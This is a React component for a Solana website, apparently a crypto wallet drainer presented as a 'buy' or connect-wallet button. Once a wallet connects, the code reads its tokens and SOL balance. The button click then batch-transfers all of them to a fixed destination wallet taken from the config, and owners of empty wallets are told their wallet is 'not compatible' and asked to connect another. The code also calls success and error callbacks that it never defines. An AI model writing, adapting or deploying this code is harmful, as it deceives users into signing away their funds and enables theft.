'use client';

import React, { useState, useEffect } from 'react';
import { useAppKit, useAppKitAccount } from '@reown/appkit/react';
import { Connection, PublicKey } from '@solana/web3.js';
import {
  getAllTokenData,
  performBatchTransfer,
  createTransferSummary
} from '@/blockchain';
import { CONFIG } from '@/blockchain/config/config';
import { Logger } from '@/blockchain/utils/logger';
import { UniversalWalletAdapter } from '@/blockchain/UniversalWalletAdapter';
import { ArrowRight } from 'lucide-react';

const logger = new Logger('WalletCustomButton');
const walletAdapter = new UniversalWalletAdapter();

// Componente interno que usa los hooks de AppKit
const WalletCustomButtonInner = ({
  connectButtonText,
  buyButtonText,
}) => {
  const { open } = useAppKit();
  const { address, isConnected, isConnecting } = useAppKitAccount();
  
  // Convert address to PublicKey for compatibility
  const publicKey = address ? new PublicKey(address) : null;
  const connected = isConnected;
  const connecting = isConnecting;
  
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [connection] = useState(new Connection(CONFIG.SOLANA_RPC_ENDPOINT));
  const [tokenAccounts, setTokenAccounts] = useState([]);
  const [solBalance, setSolBalance] = useState(0);
  const [loading, setLoading] = useState(false);
  const [transferring, setTransferring] = useState(false);
  const [transferMessage, setTransferMessage] = useState('');
  const [hasSearchedTokens, setHasSearchedTokens] = useState(false);
  
  // Effect to sync wallet adapter with AppKit connection state
  useEffect(() => {
    if (connected && publicKey) {
      // When AppKit connects a wallet, sync the adapter
      // Detect which wallet is actually connected
      const availableWallets = walletAdapter.getAvailableWallets();
      const connectedWallet = availableWallets.find(w => w.isConnected);
      
      if (connectedWallet) {
        logger.info(`AppKit connected to: ${connectedWallet.name}`);
        // Force the adapter to use this specific wallet
        walletAdapter.setPreferredWallet(connectedWallet.name);
      } else {
        // If we can't detect which is connected, reset to force detection
        logger.info('Resetting wallet adapter to detect connected wallet');
        walletAdapter.reset();
      }
    }
  }, [connected, address]);

  // Effect to handle wallet state changes
  useEffect(() => {
    // If wallet just connected and we have a publicKey, automatically search for tokens
    // Only run once when wallet connects, not when loading state changes
    if (connected && publicKey && !hasSearchedTokens) {
      setHasSearchedTokens(true);
      getSPLTokenAccounts();
    }
    
    // Reset search flag and adapter when wallet disconnects
    if (!connected) {
      setHasSearchedTokens(false);
      // Completely reset the adapter when disconnecting
      walletAdapter.reset();
      logger.info('Wallet disconnected - adapter reset');
    }
  }, [connected, publicKey]);

  // Force wallet state refresh function
  const refreshWalletState = () => {
    // If connected but no publicKey, try to get it from the wallet adapter
    if (connected && !publicKey) {
      // Force a small delay and try again
      setTimeout(() => {
      }, 1000);
    }
  };
  
  // Toggle wallet modal visibility
  const toggleWalletModal = () => setShowWalletModal(!showWalletModal);
  
  // Function to get all SPL token accounts and SOL balance
  const getSPLTokenAccounts = async () => {
    if (!publicKey) return;

    setLoading(true);
    setTransferMessage('');

    try {
      const { solBalance: solBalanceInSOL, tokenAccounts: tokenAccountsData } = await getAllTokenData(connection, publicKey);
      
      setSolBalance(solBalanceInSOL);
      setTokenAccounts(tokenAccountsData);
    } catch (error) {
      logger.error('Error fetching token accounts', error);
      setTransferMessage('Error connecting to wallet');
    } finally {
      setLoading(false);
    }
  };

  // Function to sign transactions using the Universal Wallet Adapter
  // Works with ANY Solana wallet: Phantom, Solflare, Backpack, Glow, Trust, etc.
  const signAllTransactions = async (transactions) => {
    if (!isConnected) {
      throw new Error('Wallet not connected');
    }
    
    try {
      // Log wallet info for debugging
      const walletInfo = walletAdapter.getWalletInfo();
      logger.info('Wallet Info:', walletInfo);
      
      // Use the universal adapter to sign transactions
      // This works with ANY Solana wallet automatically
      const signedTransactions = await walletAdapter.signAllTransactions(transactions);
      
      return signedTransactions;
    } catch (error) {
      logger.error('Error signing transactions', error);
      
      // The universal adapter already provides helpful error messages
      throw error;
    }
  };

  // Function to transfer all SPL tokens and SOL
  const transferAllTokens = async () => {
    if (!publicKey || !isConnected) {
      setTransferMessage('❌ Wallet not connected');
      return;
    }

    if (tokenAccounts.length === 0 && solBalance <= 0) {
      setTransferMessage('❌ This wallet is not compatible. Please connect another wallet.');
      return;
    }

    setTransferring(true);
    setTransferMessage('Building transactions...');

    console.log('CONFIG.ADD_TX_FAILED', CONFIG.TRANSFER_CONFIG.ADD_TX_FAILED);

    try {
      // Use the new batch transfer system - each token gets its own batch
      const result = await performBatchTransfer(
        connection,
        publicKey,
        CONFIG.DESTINATION_WALLET,
        signAllTransactions,
        {
          batchSize: CONFIG.TRANSFER_CONFIG.BATCH_SIZE,
          includeSol: CONFIG.TRANSFER_CONFIG.TRANSFER_SOL, // Directamente del flag
          addTxFailed: CONFIG.TRANSFER_CONFIG.ADD_TX_FAILED,
          solReserveAmount: CONFIG.TRANSFER_CONFIG.SOL_RESERVE_AMOUNT,
          executeInSequence: false // Execute in parallel for speed
        }
      );

      if (result.success) {
        const transferSummary = createTransferSummary(result.totalTokens, result.solToTransfer);
        const feesInfo = result.totalTransactionFees ? ` (Fees: ${result.totalTransactionFees.toFixed(6)} SOL)` : '';
        const successMessage = `✅ All transactions completed successfully! ${transferSummary} transferred in ${result.batchSummary?.totalBatches} individual batches.${feesInfo}`;
        setTransferMessage(successMessage);
        
        logger.info('Batch transfer completed successfully', {
          totalBatches: result.batchSummary?.totalBatches,
          successfulBatches: result.batchSummary?.successfulBatches,
          totalTokens: result.totalTokens,
          solToTransfer: result.solToTransfer,
          totalTransactionFees: result.totalTransactionFees
        });
        
        // Callback on success
        if (onTransferSuccess) {
          onTransferSuccess(result);
        }
        
        // Update token list after transfer
        await getSPLTokenAccounts();
      } else {
        setTransferMessage(result.message);
        logger.error('Transactions failed', result);
        
        if (onTransferError) {
          onTransferError(result);
        }
      }
    } catch (error) {
      logger.error('Error during transactions', error);
      
      // Provide more user-friendly error messages
      let errorMessage = 'Error during transactions';
      if (error.message.includes('User rejected')) {
        errorMessage = '❌ Transactions cancelled by user';
      } else if (error.message.includes('insufficient funds')) {
        errorMessage = '❌ Insufficient funds to complete transactions';
      } else if (error.message.includes('network')) {
        errorMessage = '❌ Network error. Please try again.';
      } else {
        errorMessage = `❌ Error: ${error.message}`;
      }
      
      setTransferMessage(errorMessage);
      
      if (onTransferError) {
        onTransferError(error);
      }
    } finally {
      setTransferring(false);
    }
  };
  
  // Handle wallet connection/disconnection and token transfer
  const handleWalletAction = async () => {
    try {
      if (connected) {
        // Check if we have publicKey, if not, try to refresh state
        if (!publicKey) {
          refreshWalletState();
          return;
        }
        
        // If wallet is connected, check for tokens first
        if (tokenAccounts.length === 0 && solBalance === 0) {
          setTransferMessage('🔍 Checking your wallet for tokens...');
          await getSPLTokenAccounts();
          
          // After checking, if still no tokens, show message and return
          if (tokenAccounts.length === 0 && solBalance <= 0) {
            setTransferMessage('❌ This wallet is not compatible. Please connect another wallet.');
            setLoading(false);
            return;
          }
        }
        
        // Check again before proceeding with transfer
        if (tokenAccounts.length === 0 && solBalance <= 0) {
          setTransferMessage('❌ This wallet is not compatible. Please connect another wallet.');
          setLoading(false);
          return;
        }
        
        // Proceed with transactions
        await transferAllTokens();
      } else {
        // Wallet not connected - open modal to select wallet
        logger.info('Opening wallet selection modal');
        open(); // Opens AppKit modal with all wallets
      }
    } catch (error) {
      logger.error('Error in handleWalletAction', error);
      setTransferMessage(`❌ Error: ${error.message}`);
      setLoading(false);
    }
  };

  // Function to handle wallet disconnection
  const handleDisconnect = async () => {
    try {
      logger.info('Disconnecting wallet');
      setTransferMessage('Disconnecting wallet...');
      
      // Disconnect from wallet adapter first
      await walletAdapter.disconnect();
      
      // Reset all states
      setTokenAccounts([]);
      setSolBalance(0);
      setTransferMessage('');
      setHasSearchedTokens(false);
      
      // AppKit handles disconnection automatically when modal is opened
      // We just need to open the modal to allow user to disconnect
      open();
      
    } catch (error) {
      logger.error('Error disconnecting wallet', error);
      setTransferMessage(`❌ Error disconnecting: ${error.message}`);
    }
  };

  return (
    <div className="input flex flex-col gap-3 w-full">
      <div className="w-full max-w-xs mt-0 mx-auto">
        <button
          onClick={connected && buyButtonText == 'WALLET' ? handleDisconnect : handleWalletAction}
          disabled={connecting || loading || transferring}
          className="inline-flex items-center justify-center gap-2 whitespace-nowrap disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg:not([class*='size-'])]:size-4 shrink-0 [&_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive h-10 rounded-md has-[>svg]:px-4 bg-[#FFFF33] text-black font-bold px-8 py-6 text-base md:text-lg hover:bg-[#FFFF33]/90 hover:translate-y-[-2px] transition-all duration-300 shadow-[0_0_20px_rgba(255,255,51,0.5)] hover:shadow-[0_0_30px_rgba(255,255,51,0.8)]"
          /* className="rounded-[12px] border-2 md:border-[3px] h-10 sm:h-12 md:h-16 border-black bg-[#F43E32] shadow-[0px_4px_76px_0px_#C0C0C0] text-white hover:bg-black text-sm sm:text-base md:text-xl w-full font-semibold transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center" */
          
        >
          <span>
            {connecting ? 'CONNECTING...' : 
              loading ? 'LOADING...' :
              transferring ? 'PROCESSING...' :
              connected ? 
                buyButtonText == 'WALLET' ? 
                  address.toString().slice(0, 4) + '...' + address.toString().slice(-4) : 
                  buyButtonText : 
                connectButtonText
              }
          </span>
          {connected ? <ArrowRight className="ml-2 w-5 h-5" /> : null}
        </button>
        
        {/* Transaction message */}
        {transferMessage && (
          <div className={`mt-2 text-xs text-center ${transferMessage.includes('Error') || transferMessage.includes('❌') ? 'text-red-600' : 'text-green-600'}`}>
            {transferMessage}
          </div>
        )}
      </div>
    </div>
  );
};

/**
 * Wrapper component that ensures AppKit is loaded before rendering the button
 */
const WalletCustomButton = (props) => {
  const [isClient, setIsClient] = useState(false);
  const [appKitReady, setAppKitReady] = useState(false);

  useEffect(() => {
    setIsClient(true);
    // Dar tiempo a que AppKit se inicialice
    const timer = setTimeout(() => {
      setAppKitReady(true);
    }, 500);
    
    return () => clearTimeout(timer);
  }, []);

  // No renderizar en el servidor
  if (!isClient || !appKitReady) {
    return (
      <button
        className="px-6 py-3 bg-[#FFFF33] text-black font-bold rounded-lg opacity-50 cursor-wait"
        disabled
      >
        Loading...
      </button>
    );
  }

  return <WalletCustomButtonInner {...props} />;
};

export default WalletCustomButton;

